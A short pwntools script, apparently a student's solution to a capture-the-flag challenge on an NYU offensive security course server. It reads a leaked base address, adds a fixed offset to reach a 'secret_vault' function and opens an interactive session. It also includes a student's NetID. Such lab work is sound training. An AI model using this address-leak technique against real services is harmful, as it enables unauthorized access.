from pwn import *

conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1233)

print(conn.recvuntil(b'Please input your NetID (something like abc123): ').decode())
conn.sendline(b'vc2499')

print(conn.recvuntil(b'I found this base address written on a post-it note: ').decode())
base_addr = u64(conn.recvn(6).ljust(8, b'\x00'))

secret_vault_addr = base_addr + 0x1269
conn.sendline(hex(secret_vault_addr))

conn.interactive()